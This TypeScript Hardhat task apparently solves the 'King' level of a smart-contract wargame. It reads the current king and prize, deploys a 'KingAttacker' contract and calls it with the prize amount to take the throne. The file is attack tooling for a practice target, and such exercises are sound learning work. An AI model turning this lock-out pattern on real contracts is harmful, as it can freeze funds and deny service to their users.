import { task } from 'hardhat/config';
import { TaskArguments } from 'hardhat/types';

task('deploy:King').setAction(async function (_: TaskArguments, { ethers }) {
  const [signer] = await ethers.getSigners();

  const king = await ethers.getContractAt(
    'King',
    '0x4Be83a673B0C0bFdAC1826c8DBAFb0074313d6A2',
  );

  const currentKing = await king._king();
  const currentPrize = await king.prize();

  if (!currentKing || !currentPrize.gt(0)) {
    throw new Error('missing params');
  }

  console.log(`Current King: ${currentKing}
  Current Prize: ${ethers.utils.formatEther(currentPrize)}`);

  const kingAttackerFactory = await ethers.getContractFactory(
    'KingAttacker',
    signer,
  );
  const kingAttacker = await kingAttackerFactory.deploy();
  await kingAttacker.deployed();
  console.log('KingAttacker deployed to: ', kingAttacker.address);

  await (
    await kingAttacker
      .connect(signer)
      .execute(king.address, { value: currentPrize })
  ).wait();
});
